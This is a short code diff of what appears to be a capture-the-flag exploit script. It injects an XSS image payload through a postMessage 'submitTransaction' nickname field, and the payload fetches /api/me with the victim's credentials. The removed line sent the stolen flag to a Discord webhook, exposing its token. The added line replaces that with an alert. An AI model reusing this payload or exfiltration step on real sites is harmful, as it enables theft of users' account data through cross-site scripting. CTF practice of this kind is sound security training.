@@ -8,7 +8,7 @@ window.onload = () => {
         const p = `<img src=x onerror="
             fetch('/api/me',{credentials:'include'})
             .then(r=>r.json())
-            .then(d=>fetch('https://discord.com/api/webhooks/1463231849550581891/xi0StB5ZOeisP2iDil0iuOYJzYhT6SYt4L4WWrEzgLqmJjSl0N5xyhrgX0zrjAq7q9o0',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'FLAG: '+d.flag})}))
+            .then(d=>alert('FLAG: '+d.flag))
         ">`;
         document.getElementById('f').contentWindow.postMessage({type:'submitTransaction',transaction:{toAddress:'deadbeef',currency:'1337COIN',amount:0.0001,nickname:p}},'*');
     },2000);
